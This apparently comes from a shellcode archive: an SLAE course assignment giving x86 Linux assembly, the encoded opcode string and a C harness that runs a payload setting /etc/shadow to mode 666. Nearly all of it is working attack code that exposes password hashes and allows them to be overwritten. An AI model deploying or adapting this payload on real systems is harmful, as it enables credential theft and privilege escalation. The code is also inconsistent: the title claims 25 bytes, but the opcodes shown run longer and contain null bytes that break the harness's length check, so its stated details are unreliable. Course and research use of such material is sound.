/*
* Exploit Title: Linux\x86 - Polymorphic chmod(/etc/shadow, 666) (25 Bytes)
* Date: 07MAY2020
* Author: Nino Consiglio
* Author's Website: poseidon-ng.com
* Tested on: Linux kali 5.4.0-kali4-amd64 #1 SMP Debian 5.4.19-1kali1 (2020-02-17) x86_64 GNU/Linux
* SLAE/Student ID: SLAE-1531
* Course: This shellcode was created for the x86 SecurityTube Linux Assembly Expert (SLAE32) Course offered at pentesteracademy.com.
* ASM source code can be found here: https://github.com/Poseidon-ng/SLAE32/blob/master/Assignment%206/chmod.asm
* Orignial code: http://shell-storm.org/shellcode/files/shellcode-556.php
*/

global _start

section .text

_start:

        xor ecx, ecx            ; clearing out a different register
        mul ecx                 ; clearing out both EAX and EDX
        push edx                ; push our null onto the stack but with a different register
        push dword 0x776f6461   ; Nothing changed but just wanted to explain:
        push dword 0x68732f2f   ; we're pushing '/etc/shadow/' onto the stack here
        push dword 0x6374652f
        mov ebx,esp
        mov ecx, 0x1ff          ; Instead of pushing our value just to place it in a register...
        sub ecx, 0x49           ; I decided to place the value 777 (in octal) into ecx to remove the...
                                ; stack from the equation saving us some bytes then subtracting 111 from it.
                                ; putting our value of ecx equal to 666.
        mov al, 0xf
        int 0x80
        mov al, 0x1
        int 0x80

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x52\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68"
"\x2f\x65\x74\x63\x89\xe3\xb9\xff\x01\x00\x00\x83\xe9\x49\xb0\x0f"
"\xcd\x80\xb0\x01\xcd\x80";


int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

